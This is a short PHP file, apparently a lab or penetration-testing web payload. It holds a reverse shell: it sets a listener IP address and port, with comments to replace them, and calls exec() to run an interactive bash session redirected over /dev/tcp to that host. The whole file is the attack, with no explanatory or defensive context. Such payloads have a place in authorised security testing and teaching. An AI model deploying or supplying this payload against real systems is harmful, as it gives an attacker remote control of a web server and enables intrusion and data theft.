<?php
$ip = '10.8.30.74';  // Replace with your IP address
$port = 5558;  // Replace with your listening port
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
